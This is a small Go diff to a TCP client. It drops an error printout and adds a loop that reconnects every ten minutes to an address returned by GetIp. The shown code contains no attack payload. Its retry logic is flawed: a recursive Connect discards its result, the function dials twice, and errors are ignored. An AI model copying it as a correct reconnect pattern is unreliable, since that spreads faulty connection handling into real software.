@@ -2,7 +2,6 @@ package main
 
 import (
 	"bufio"
-	"fmt"
 	"io"
 	"io/ioutil"
 	"net"
@@ -22,11 +21,18 @@ func Connect() (net.Conn, error) {
 	ip = GetIp()
 	_, err := net.Dial("tcp", ip)
 	if err != nil {
-		fmt.Println(err.Error())
-		Wait()
+		Wait(160)
 		Connect()
 	}
 	return net.Dial("tcp", ip)
+}
+
+func Reconnect() {
+	//Every 10 mins
+	for {
+		Wait(60 * 10)
+		c, _ = Connect()
+	}
 }
 
 func GetIp() string {
